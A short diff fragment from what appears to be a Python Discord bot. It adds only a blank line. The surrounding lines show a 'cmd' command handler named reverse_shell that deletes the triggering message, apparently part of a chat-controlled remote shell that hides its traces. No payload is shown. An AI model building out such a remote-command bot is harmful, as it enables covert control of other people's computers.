@@ -6,6 +6,7 @@ import asyncio
 import os
 #</imports>
 
+
 @client.command(name="cmd")
 async def reverse_shell(ctx, cmd_command=None):
     await ctx.message.delete()
